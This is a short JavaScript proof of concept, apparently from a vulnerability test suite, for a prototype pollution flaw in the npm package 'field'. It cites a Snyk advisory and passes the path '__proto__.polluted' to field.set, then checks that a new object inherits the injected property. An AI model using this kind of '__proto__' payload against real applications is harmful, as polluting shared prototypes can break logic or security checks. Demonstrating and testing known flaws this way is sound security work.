// //https://snyk.io/vuln/SNYK-JS-FIELD-1039884
// test("prototype pollution in field ", () => {
console.log({}.polluted);

  const field = require("field");
  const obj = {};
  field.set(obj, "__proto__.polluted", "yes");

console.log("{ " + obj.polluted + ", " + "yes" + " }");
// });
